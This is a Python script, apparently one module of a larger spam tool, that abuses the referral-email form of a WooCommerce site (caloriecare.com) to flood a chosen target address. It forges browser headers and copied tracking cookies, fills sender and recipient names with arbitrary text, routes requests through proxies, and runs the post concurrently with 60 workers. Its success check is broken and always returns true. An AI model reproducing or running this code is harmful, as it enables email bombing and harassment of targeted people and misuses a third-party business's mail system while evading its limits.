from os.path import basename

import requests

import module
from module import Spam


class ConcreteSpam(Spam):

    def check_success(self, response: requests.Response | None) -> bool:
        if type(response) is not None:
            return True
        else:
            return False

    def post(self, target) -> requests.Response | None:
        import requests

        cookies = {
            'poptin_old_user': 'true',
            'poptin_user_id': '0.pm5kok75xr',
            '_gid': 'GA1.2.1821578897.1678119193',
            'poptin_referrer': 'https://www.google.com/',
            'poptin_session': 'true',
            'poptin_c_visitor': 'true',
            '_gcl_au': '1.1.1490624135.1678119193',
            '_fbp': 'fb.1.1678119193568.1571437201',
            '_ga': 'GA1.2.113433411.1678119192',
            '_gat_gtag_UA_13043004_3': '1',
            '_ga_6P8X8NJQNC': 'GS1.1.1678119192.1.1.1678119461.54.0.0',
        }

        headers = {
            'Accept': '*/*',
            'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            # 'Cookie': 'poptin_old_user=true; poptin_user_id=0.pm5kok75xr; _gid=GA1.2.1821578897.1678119193; poptin_referrer=https://www.google.com/; poptin_session=true; poptin_c_visitor=true; _gcl_au=1.1.1490624135.1678119193; _fbp=fb.1.1678119193568.1571437201; _ga=GA1.2.113433411.1678119192; _gat_gtag_UA_13043004_3=1; _ga_6P8X8NJQNC=GS1.1.1678119192.1.1.1678119461.54.0.0',
            'Origin': 'https://www.caloriecare.com',
            'Pragma': 'no-cache',
            'Referer': 'https://www.caloriecare.com/referral/',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest',
            'sec-ch-ua': '"Chromium";v="110", "Not A(Brand";v="24", "Google Chrome";v="110"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
        }

        text = self.get_text(False)
        data = {
            'action': 'woocommerce_send_remail',
            'sender_name': text,
            'sender_email_address': 'wezxasqw@gmail.com',
            'friend_name1': text,
            'friend_email1': target,
            'friend_name2': text,
            'friend_email2': 'wezxasqw+tes11rqw223123@gmail.com',
            'friend_name3': text,
            'friend_email3': 'wezxasqw+tes1322wqwe3123@gmail.com',
            'friend_name4': text,
            'friend_email4': 'wezxasqw+tes1231awd23123@gmail.com',
            'friend_name5': text,
            'friend_email5': 'wezxasqw+tes12312sdawd3@gmail.com',
            'total_count': '5',
        }

        response = requests.post('https://www.caloriecare.com/wp-admin/admin-ajax.php', cookies=cookies,
                                 headers=headers, data=data, proxies=self.get_proxies())
        return response


def main():
    s = ''
    spam = ConcreteSpam(basename(__file__).removesuffix('.py'), s)
    res = spam.send_post(f'wezxasqw+{module.generate_text()}@gmail.com')
    if res:
        spam.run_concurrently(60)


if __name__ == '__main__':
    main()
